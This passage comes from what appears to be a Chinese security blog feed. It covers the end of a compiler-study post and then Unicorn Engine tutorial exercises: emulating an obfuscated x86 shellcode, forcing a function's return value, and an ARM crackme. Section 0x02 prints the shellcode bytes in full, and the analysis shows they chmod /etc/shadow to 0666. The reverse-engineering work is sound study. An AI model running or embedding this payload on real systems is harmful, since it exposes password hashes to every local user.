&#125;</span><br><span class="line">    <span class="keyword">virtual</span> llvm::<span class="function">Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//变量声明，两个构造方法。</span></span><br><span class="line"><span class="comment">//类型 变量名</span></span><br><span class="line"><span class="comment">//类型 变量名 = 初始值</span></span><br><span class="line"><span class="keyword">class</span> NVariableDeclaration : <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; type;</span><br><span class="line">    NIdentifier&amp; id;</span><br><span class="line">    NExpression *assignmentExpr;</span><br><span class="line">    NVariableDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, NIdentifier&amp; id) :</span><br><span class="line">        type(type), id(id) &#123; assignmentExpr = <span class="literal">NULL</span>; &#125;</span><br><span class="line">    NVariableDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) :</span><br><span class="line">        type(type), id(id), assignmentExpr(assignmentExpr) &#123; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> llvm::<span class="function">Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> NExternDeclaration : <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; type;</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; id;</span><br><span class="line">    VariableList arguments;</span><br><span class="line">    NExternDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, <span class="keyword">const</span> NIdentifier&amp; id,</span><br><span class="line">            <span class="keyword">const</span> VariableList&amp; arguments) :</span><br><span class="line">        type(type), id(id), arguments(arguments) &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> llvm::<span class="function">Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="3-3-代码生成-还在看"><a href="#3-3-代码生成-还在看" class="headerlink" title="3.3 代码生成(还在看)"></a>3.3 代码生成(还在看)</h6><p>这部分如果纯自己做的话，怕是要写好久了，如果使用llvm的话，就快很多。</p>
<p>这部分的代码还在看，要结合<a href="http://llvm.org/" target="_blank" rel="noopener">llvm的文档来看</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00:前言&quot;&gt;&lt;/a&gt;0x00:前言&lt;/h4&gt;&lt;p&gt;一直想做的fuzzer涉及到很多语法相关的东西，编译原理相关的补课迫在眉睫-。- 不过也只能慢慢的来学习。这篇文章准备慢慢更新，涉及我的学习过程和对以前的大佬的一个toy compiler的学习，理论+实践才是王道。&lt;/p&gt;
    
    </summary>
    
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="compiler" scheme="http://o0xmuhe.me/tags/compiler/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn Engine初体验</title>
    <link href="http://o0xmuhe.me/2018/01/15/Unicorn-Engine%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://o0xmuhe.me/2018/01/15/Unicorn-Engine初体验/</id>
    <published>2018-01-15T14:29:01.000Z</published>
    <updated>2018-01-20T07:34:48.400Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-关于unicorn-engine"><a href="#0x00-关于unicorn-engine" class="headerlink" title="0x00:关于unicorn engine"></a>0x00:关于unicorn engine</h4><p>Unicorn Engine是一个模拟器(emulator)，简单的来说就是可以模拟执行程序or片段的代码。对于逆向分析来说很有用，比如分析某个片段的代码的作用；对于漏洞挖掘选手来说，前一段时间的unicorn-afl着实亮眼，不过有带更深入的研究。</p>
<a id="more"></a>
<h4 id="0x01-关于本文"><a href="#0x01-关于本文" class="headerlink" title="0x01:关于本文"></a>0x01:关于本文</h4><p>很巧，今天玄武推送推了一篇<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Unicorn Engine tutorial</a>，感觉写的很好，作者也很有趣，文章中还布置了<code>home work</code>，哈哈哈，上班的时候没时间做，下班回到家就看了看，模仿者第一个例子，和作者给出的hint把两个<code>home work</code>做了下。</p>
<h4 id="0x02-shellcode分析"><a href="#0x02-shellcode分析" class="headerlink" title="0x02: shellcode分析"></a>0x02: shellcode分析</h4><p>作者在这里给出了一段混淆过的shellcode，直接反汇编器查看的话，并不能直接分析出这段shellcode的作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ muheMacBookPro in /tmp [22:38:29]</span><br><span class="line">$ python -c &apos;shellcode = &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;;print shellcode&apos; &gt; sc.dump</span><br><span class="line"></span><br><span class="line"># muhe @ muheMacBookPro in /tmp [22:38:37]</span><br><span class="line">$ file sc.dump</span><br><span class="line">sc.dump: data</span><br></pre></td></tr></table></figure>
<p>用r2分析的话：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[0x00000000]&gt; pd</span><br><span class="line">            0x00000000      e8ffffffff     call 4</span><br><span class="line">            0x00000005      c05d6a05       rcr byte [rbp + 0x6a], 5</span><br><span class="line">            0x00000009      5b             pop rbx</span><br><span class="line">            0x0000000a      29dd           sub ebp, ebx</span><br><span class="line">            0x0000000c      83c54e         add ebp, 0x4e               ; <span class="string">'N'</span></span><br><span class="line">            0x0000000f      89e9           mov ecx, ebp</span><br><span class="line">            0x00000011      6a02           push 2                      ; 2</span><br><span class="line">            0x00000013      030c24         add ecx, dword [rsp]</span><br><span class="line">            0x00000016      5b             pop rbx</span><br><span class="line">            0x00000017      31d2           xor edx, edx</span><br><span class="line">            0x00000019      66ba1200       mov dx, 0x12                ; 18</span><br><span class="line">        ┌─&gt; 0x0000001d      8b39           mov edi, dword [rcx]</span><br><span class="line">        ⁝   0x0000001f      c1e710         shl edi, 0x10</span><br><span class="line">        ⁝   0x00000022      c1ef10         shr edi, 0x10</span><br><span class="line">        ⁝   0x00000025      81e9feffffff   sub ecx, 0xfffffffe</span><br><span class="line">        ⁝   0x0000002b      8b4500         mov eax, dword [rbp]</span><br><span class="line">        ⁝   0x0000002e      c1e010         shl eax, 0x10</span><br><span class="line">        ⁝   0x00000031      c1e810         shr eax, 0x10</span><br><span class="line">        ⁝   0x00000034      89c3           mov ebx, eax</span><br><span class="line">        ⁝   0x00000036      09fb           or ebx, edi</span><br><span class="line">        ⁝   0x00000038      21f8           and eax, edi</span><br><span class="line">        ⁝   0x0000003a      f7d0           not eax</span><br><span class="line">        ⁝   0x0000003c      21d8           and eax, ebx</span><br><span class="line">        ⁝   0x0000003e      66894500       mov word [rbp], ax</span><br><span class="line">        ⁝   0x00000042      83c502         add ebp, 2</span><br><span class="line">        ⁝   0x00000045      4a85d2         <span class="built_in">test</span> rdx, rdx</span><br><span class="line">        └─&lt; 0x00000048      0f85cfffffff   jne 0x1d</span><br><span class="line">            0x0000004e      ec             <span class="keyword">in</span> al, dx</span><br><span class="line">            0x0000004f      37             invalid</span><br><span class="line">        ┌─&lt; 0x00000050      755d           jne 0xaf</span><br><span class="line">       ┌──&lt; 0x00000052      7a05           jp 0x59</span><br><span class="line">       ││   0x00000054      28ed           sub ch, ch</span><br><span class="line">       ││   0x00000056      24ed           and al, 0xed</span><br><span class="line">       ││   0x00000058      24ed           and al, 0xed</span><br><span class="line">        │   0x0000005a      0b887feb5098   or ecx, dword [rax - 0x67af1481]</span><br><span class="line">        │   0x00000060      38f9           cmp cl, bh</span><br><span class="line">        │   0x00000062      5c             pop rsp</span><br><span class="line">        │   0x00000063      96             xchg eax, esi</span><br><span class="line">        │   0x00000064      2b9670fec6ff   sub edx, dword [rsi - 0x390190]</span><br><span class="line">        │   0x0000006a      c6             invalid</span><br><span class="line">        │   0x0000006b      ff9f321f581e   lcall [rdi + 0x1e581f32]</span><br><span class="line">        │   0x00000071      00d3           add bl, dl</span><br><span class="line">        │   0x00000073      800aff         or byte [rdx], 0xff</span><br><span class="line">        │   0x00000076      ff             invalid</span><br><span class="line">        │   0x00000077      ff             invalid</span><br><span class="line">        │   0x00000078      ff             invalid</span><br><span class="line">        │   0x00000079      ff             invalid</span><br><span class="line">        │   0x0000007a      ff             invalid</span><br><span class="line">        │   0x0000007b      ff             invalid</span><br></pre></td></tr></table></figure>
<p>事实是啥都看不出来，但是作者说：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Note that the architecture is x86-32 now. List of syscalls numbers can be found here.</span><br></pre></td></tr></table></figure>
<p>32位的，而且是调用了系统调用搞事情的。<br>那就可以模仿文中的例子，模拟执行这段代码，然后对系统调用打hook，把参数print出来，然后再跳过去。</p>
<p>根据资料，调用号放在eax寄存器，参数的顺序是：ebx,ecx,edx,esi,edi。<br>下面就是hook了<code>int 80h</code>指令，然后搞事情。</p>
<p>我的hook函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    op_code = mu.mem_read(address, size)</span><br><span class="line">    <span class="keyword">if</span> op_code == <span class="string">"\xcd\x80"</span>:</span><br><span class="line">        call_number = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">        param1 = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        param2 = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        param3 = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        param4 = mu.reg_read(UC_X86_REG_ESI)</span><br><span class="line">        param5 = mu.reg_read(UC_X86_REG_EDI)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[*]Result as followed:"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tCall number: &#123;0&#125;"</span>.format(call_number))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam1     : &#123;0&#125;"</span>.format(param1))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam2     : &#123;0&#125;"</span>.format(param2))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam3     : &#123;0&#125;"</span>.format(param3))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam4     : &#123;0&#125;"</span>.format(param4))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam5     : &#123;0&#125;"</span>.format(param5))</span><br><span class="line"></span><br><span class="line">        mu.reg_write(UC_X86_REG_EIP, address + size)</span><br></pre></td></tr></table></figure>
<p> 运行结果：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> $ python task1.py</span><br><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 15</span><br><span class="line">4Param1     : 4194392</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 1</span><br><span class="line">4Param1     : 4194392</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br></pre></td></tr></table></figure>
<p>第四、第五个参数应该没用到，第一次调用时15号调用，第二次是1号调用。查了一下，15号是chmod，1号是exit。<br>chmod的参数应该是文件名，权限。exit的参数的话，就是4194392。</p>
<p>就是想办法确定chmod操作了什么文件，4194392应该是一个指针。修改hook函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"\tCall number: &#123;0&#125;"</span>.format(call_number))</span><br><span class="line">        <span class="keyword">if</span> call_number == <span class="number">15</span>:</span><br><span class="line">            file = mu.mem_read(param1, <span class="number">32</span>).split(<span class="string">"\x00"</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\t[*]File is &#123;0&#125;"</span>.format(file))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\tParam1     : &#123;0&#125;"</span>.format(param1))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 15</span><br><span class="line">4[*]File is /etc/shadow</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 1</span><br><span class="line">4Param1     : 4194392</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br></pre></td></tr></table></figure>
<p>chmod的第二个参数其实就是0666:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; oct(438)</span><br><span class="line">&apos;0666&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>到此，分析完毕。</p>
<h4 id="0x03-修改函数的返回值"><a href="#0x03-修改函数的返回值" class="headerlink" title="0x03: 修改函数的返回值"></a>0x03: 修改函数的返回值</h4><p>修改下面程序的逻辑，使得返回值是1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//get length</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr = a;</span><br><span class="line">    <span class="keyword">while</span>(*ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//comparestrings</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]!=b[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((stdcall))</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">super_function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">"batman"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    super_function(<span class="number">1</span>, <span class="string">"spiderman"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个也好做，直接调用super_function,然后根据栈的结构，直接把参数改了，因为是x86，c语言的调用约定是从右到左依次压栈，所以字符串spiderman的指针是第一个压栈的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">saved ebp</span><br><span class="line">ret addr</span><br><span class="line">1</span><br><span class="line">ptr ---&gt; &quot;spiderman\0&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>大概就是上面这样。</p>
<p>这部分比较容易，自己编译一个这个程序，然后找一下super_function函数的开头和结尾。</p>
<p>这个bin文件在mac上编译出来，地址啥的不一样，写脚本的时候要注意，bin文件映射地址最好是ida里分析的文件起始地址，这样的话，后面调用super func的时候，地址啥的可以直接用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0x00000000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x40000000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./function"</span>))</span><br><span class="line">r_esp = STACK_ADDR + (STACK_SIZE/<span class="number">2</span>)     <span class="comment">#ESP points to this address at function call</span></span><br><span class="line"></span><br><span class="line">STRING_ADDR = <span class="number">0x40000000</span></span><br><span class="line">mu.mem_write(STRING_ADDR, <span class="string">"batman\x00"</span>) <span class="comment">#write "batman" somewhere. We have choosen an address 0x0 which belongs to the stack.</span></span><br><span class="line"></span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, r_esp)     <span class="comment">#set ESP</span></span><br><span class="line">mu.mem_write(r_esp+<span class="number">4</span>, p32(<span class="number">5</span>))           <span class="comment">#set the first argument. It is integer 5</span></span><br><span class="line">mu.mem_write(r_esp+<span class="number">8</span>, p32(STRING_ADDR)) <span class="comment">#set the second argument. This is a pointer to the string "batman"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.emu_start(<span class="number">0x0000057B</span>, <span class="number">0x000005B1</span>)      <span class="comment">#start emulation from the beginning of super_function, end at RET instruction</span></span><br><span class="line">return_value = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The returned value is: %d"</span> % return_value</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Downloads [15:19:10]</span></span><br><span class="line">$ python task2.py</span><br><span class="line">The returned value is: 1</span><br></pre></td></tr></table></figure>
<h4 id="0x04-arm32的一个cm"><a href="#0x04-arm32的一个cm" class="headerlink" title="0x04: arm32的一个cm"></a>0x04: arm32的一个cm</h4><p>类似于作者原文的第一个demo，就是那个ctf题目，只不过这次arch换成了arm32，注意大小端。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v3 = ccc(<span class="number">0x2710</span>u, (<span class="keyword">int</span>)argv, (<span class="keyword">int</span>)envp);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_745A4, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在没有arm环境的情况下，使用unicorn来得出这个函数结算结果-。- 虽然我有arm环境 2333333</p>
<p>搜了一下arm传参的方式：</p>
<ol>
<li><p>输入参数通过r0-r3传递，多余的放入堆栈中；返回值放入r0，不够的话放入{r0,r1}或者{r0,r1,r2,r3}，比如：<br>int foo(int a, int b, int c, int d), 输入：r0 = a, r1 = b, r2 = c, r3 = d，返回：r0 = 类型为int的retvalue<br>int <em>foo(char a, double b, int c, char d), 输入：r0 = a, r1用于对齐(double 要求8字节对齐), b = {r2, r3}，c放在堆栈的sp[0]位置，d放在堆栈的sp[4]位置，这里的sp是指进入函数时的sp；返回：r0 = 类型为int </em>的retvalue</p>
</li>
<li><p>注意如果返回值是结构体，情况有些特殊：<br>struct client foo(int a, char b, float c), 输入：r0 = 一个strcut client <em>变量，由调用者给出, r1 = a, r2 = b, r3 = c；返回：strcut client </em>变量，和调用者给的一样</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span 